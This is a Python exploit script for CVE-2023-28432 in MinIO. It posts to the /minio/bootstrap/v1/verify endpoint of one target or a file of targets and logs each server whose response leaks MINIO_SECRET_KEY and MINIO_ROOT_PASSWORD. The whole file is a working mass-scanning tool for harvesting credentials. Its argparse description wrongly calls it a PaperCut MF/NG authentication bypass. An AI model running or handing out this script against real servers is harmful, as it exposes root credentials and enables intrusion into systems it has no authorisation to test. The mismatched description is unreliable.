# CVE-2023-28432
import requests
import argparse
import os
import sys

def disable_ssl_warnings():
  
    import urllib3
    urllib3.disable_warnings()

def clear_terminal():
  
    os.system('cls' if os.name == 'nt' else 'clear')

def parse_args():
  
    parser = argparse.ArgumentParser(description="Exploit an authentication bypass vulnerability in PaperCut MF/NG.")
    parser.add_argument('-u', '--url', help='URL to exploit Without HTTPS:// or HTTP://')
    parser.add_argument('-f', '--file', help='File containing URLs Without HTTPS:// or HTTP://')   
    parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while requesting a web page (default: 10)', default=10, type=int)
    return parser.parse_args()


def exploit(url,time):

    if not url.startswith('http'):

        url = 'http://' + url.strip()
    target_url = url.strip() + "/minio/bootstrap/v1/verify"
    header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    data=""
    try:

        response = requests.post(target_url, headers=header, timeout=time,data=data,verify=False)
        s = requests.session()
        s.keep_alive = False

        if response.status_code == 200 and ("MINIO_SECRET_KEY" in response.text) and ("MINIO_ROOT_PASSWORD" in response.text):
            with open('results.txt', 'a') as f:
                f.write(target_url + "\n")
                print("[#] Found a vulnerable URL: {}".format(target_url))
    
    except requests.exceptions.RequestException as e:
        print("[-] Failed to connect to {}: {}".format(target_url, e))


def main():
  
    disable_ssl_warnings()
    clear_terminal()

    print("""
    
    #########################################################
    #                                                       #
    #        Minio - Information Disclosure                 #
    #             Severity: High                            #
    #                                                       #
    #########################################################
    
    [$] Description:
    
    Minio server is vulnerable to CVE-2023-28432, an Information Disclosure vulnerability in the /minio/bootstrap/v1/verify endpoint. 
    In a cluster deployment, MinIO returns all environment variables, including MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD, resulting in Information Disclosure.
    https://pentest-tools.com/vulnerabilities-exploits/minio-information-disclosure_CVE-2023-28432
    
    """)

    args = parse_args()

    if args.file:
        print("[#] Fetching URLs from Provided file...")
        
        with open(args.file, "r") as f:
            urls = [url.strip() for url in f.readlines() if url.strip()]
            
            for url in urls:
                print(f"[#] Target: {url}")
                exploit(url, args.timeout)

    elif args.url:
        print(f"[#] Target: {args.url}")
        exploit(args.url, args.timeout)

if __name__ == "__main__":
    main()
